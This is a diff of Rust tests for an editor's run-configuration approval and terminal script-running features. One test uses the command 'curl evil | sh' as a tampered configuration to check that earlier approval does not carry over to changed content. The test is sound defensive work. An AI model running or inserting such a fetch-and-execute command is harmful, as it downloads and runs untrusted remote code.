@@ -314,26 +314,26 @@ fn editing_creates_the_file_on_request() {
     let root = app.editor.root().unwrap().to_path_buf();
     let config = app.run.current().unwrap();
     let key = winc_config::run_configs_path(&root).join(&config.name);
-    assert_eq!(app.state.trusted_repo(&key), Some(config.fingerprint()));
+    assert!(app.state.command_approved(&key, &config.approval()));
     clean(&dir);
 }
 
-/// 同意运行后记下配置的指纹，只对内容相同的配置有效。
+/// 同意运行后记下配置的内容，只对内容相同的配置有效。
 #[test]
 fn approval_covers_only_the_same_content() {
     let (mut app, dir, _log) = app_with_configs("run-approve");
     let root = app.editor.root().unwrap().to_path_buf();
     let key = winc_config::run_configs_path(&root).join("api");
     let config = app.run.current().unwrap().clone();
-    assert_eq!(app.state.trusted_repo(&key), None);
+    assert!(!app.state.command_approved(&key, &config.approval()));
     app.approved_run(config.clone());
-    assert_eq!(app.state.trusted_repo(&key), Some(config.fingerprint()));
+    assert!(app.state.command_approved(&key, &config.approval()));
     assert_eq!(app.terminal.tabs.len(), 1);
     let changed = winc_config::RunConfig {
         command: "curl evil | sh".into(),
         ..config
     };
-    assert_ne!(app.state.trusted_repo(&key), Some(changed.fingerprint()));
+    assert!(!app.state.command_approved(&key, &changed.approval()));
     clean(&dir);
 }
 
@@ -359,34 +359,35 @@ fn saving_the_file_here_approves_its_commands() {
     let root = app.editor.root().unwrap().to_path_buf();
     let path = winc_config::run_configs_path(&root);
     let key = path.join("api");
-    assert_eq!(app.state.trusted_repo(&key), None);
+    assert!(
+        app.state
+            .approved_commands()
+            .iter()
+            .all(|(at, _)| *at != key)
+    );
 
     app.open_path(&path);
     let id = app.editor.active().unwrap().id;
     app.run_file_saved(id);
-    let fingerprint = app.run.current().unwrap().fingerprint();
-    assert_eq!(app.state.trusted_repo(&key), Some(fingerprint));
+    let approval = app.run.current().unwrap().approval();
+    assert!(app.state.command_approved(&key, &approval));
 
-    // 外部改动：指纹不同，下次运行仍要确认。
+    // 外部改动：内容不同，下次运行仍要确认。
     std::fs::write(
         &path,
         r#"{"configurations": [{"name": "api", "command": "other"}]}"#,
     )
     .unwrap();
     app.reload_run_configs();
-    assert_ne!(
-        app.state.trusted_repo(&key),
-        Some(app.run.current().unwrap().fingerprint())
-    );
+    let approval = app.run.current().unwrap().approval();
+    assert!(!app.state.command_approved(&key, &approval));
 
     // 别的文件保存时不算。
     app.open_path(&root.join("short.rs"));
     let id = app.editor.active().unwrap().id;
     app.run_file_saved(id);
-    assert_ne!(
-        app.state.trusted_repo(&key),
-        Some(app.run.current().unwrap().fingerprint())
-    );
+    let approval = app.run.current().unwrap().approval();
+    assert!(!app.state.command_approved(&key, &approval));
     clean(&dir);
 }
 
@@ -421,7 +422,7 @@ fn exits_are_reported_only_when_unseen() {
     clean(&dir);
 }
 
-/// 没有运行时没有停止按钮，运行按钮紧贴位置按钮；运行时多一个停止按钮。
+/// 没有运行时没有停止按钮，运行按钮紧贴右侧的拆分按钮；运行时多一个停止按钮。
 #[test]
 fn the_stop_button_appears_only_while_running() {
     let (mut app, dir, _log) = app_with_configs("run-stop-button");
@@ -434,7 +435,7 @@ fn the_stop_button_appears_only_while_running() {
     app.new_terminal_tab_in(Vec::new());
     paint(&mut app);
     assert!(hit(&app, stop).is_none());
-    let position = hit(&app, HeaderHit::Maximize).unwrap();
+    let position = hit(&app, HeaderHit::Split).unwrap();
     let idle = hit(&app, start).unwrap();
     assert_eq!(position.x - idle.right(), crate::theme::TAB_GAP);
 
@@ -713,6 +714,71 @@ fn a_configuration_runs_in_a_real_terminal() {
     wait(&mut app, &|app| {
         app.terminal.tab().is_some_and(|t| t.sticky() == Some(0))
     });
+    clean(&dir);
+}
+
+/// 文件树里右键脚本文件：「在终端中打开」之后列出「在终端中运行」。运行时标签以文件名命名，
+/// 工作目录是脚本所在的目录，有未保存的修改先保存。其他文件和终端模块关着时不列出。
+#[cfg(unix)]
+#[test]
+fn a_script_in_the_tree_runs_in_the_terminal() {
+    use crate::app::input::context_menu::MenuTarget;
+    use std::os::unix::fs::PermissionsExt;
+
+    let dir = sample_folder("run-script");
+    std::fs::write(dir.join("build.sh"), "echo one\n").unwrap();
+    std::fs::write(dir.join("deploy"), "#!/bin/sh\necho two\n").unwrap();
+    std::fs::write(dir.join("plain"), "#!/bin/sh\necho three\n").unwrap();
+    let executable = std::fs::Permissions::from_mode(0o755);
+    std::fs::set_permissions(dir.join("deploy"), executable.clone()).unwrap();
+    std::fs::set_permissions(dir.join("a.txt"), executable).unwrap();
+    let mut app = app_with(&dir.join("short.rs"), false);
+    app.config.terminal_enabled = Some(true);
+    app.relayout();
+    let log = app.attach_recording_helper(&dir);
+    let root = app.editor.root().unwrap().to_path_buf();
+    let offered = |app: &mut App, name: &str| {
+        app.open_context_menu(MenuTarget::Tree(Some(root.join(name))), (0.0, 0.0));
+        let commands: Vec<MenuCommand> = menu_commands(app).into_iter().map(|(c, _)| c).collect();
+        app.overlays.context_menu = None;
+        let opens = commands
+            .iter()
+            .position(|c| *c == MenuCommand::OpenInTerminal);
+        opens.is_some_and(|at| commands.get(at + 1) == Some(&MenuCommand::RunScript))
+    };
+    assert!(offered(&mut app, "build.sh"));
+    assert!(offered(&mut app, "deploy"));
+    // 有 `#!` 但没有执行权限、有执行权限但没有 `#!` 的文件，以及目录，都不列出。
+    assert!(!offered(&mut app, "plain"));
+    assert!(!offered(&mut app, "a.txt"));
+    assert!(!offered(&mut app, "src"));
+    app.config.terminal_enabled = Some(false);
+    assert!(!offered(&mut app, "build.sh"));
+    app.config.terminal_enabled = Some(true);
+
+    // 脚本开着且有未保存的修改：先保存再运行。
+    let script = root.join("build.sh");
+    app.open_path(&script);
+    app.run(winc_editor::Command::Insert("# edited\n".into()));
+    assert!(app.editor.active().unwrap().is_dirty());
+    app.run_script(&script);
+    app.relayout();
+    assert!(!app.editor.active().unwrap().is_dirty());
+    let saved = std::fs::read_to_string(&script).unwrap();
+    assert!(saved.starts_with("# edited"), "{saved}");
+    assert_eq!(app.terminal.tabs[0].label(), "build.sh");
+    let sent = app.sent_to_helper(&log);
+    let Some(ToHelper::Spawn { args, cwd, .. }) =
+        sent.iter().find(|m| matches!(m, ToHelper::Spawn { .. }))
+    else {
+        panic!("应该发了 Spawn：{sent:?}");
+    };
+    let line = String::from_utf8_lossy(args.last().unwrap());
+    assert!(
+        line.starts_with("sh ") && line.ends_with("build.sh"),
+        "{line}"
+    );
+    assert_eq!(cwd, root.to_str().unwrap().as_bytes());
     clean(&dir);
 }
 
